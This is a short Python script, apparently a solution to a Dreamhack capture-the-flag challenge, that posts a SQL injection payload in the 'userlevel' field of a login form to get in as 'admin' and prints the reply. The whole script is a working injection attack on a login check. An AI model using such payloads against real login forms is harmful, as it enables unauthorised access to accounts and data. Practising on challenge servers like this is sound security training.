


import requests

HOST = "http://host3.dreamhack.games:16191/login"

DATA = {
    "userlevel":"0' AND userid='admin"
}


r = requests.post(url=HOST, data=DATA)
print(r.text)






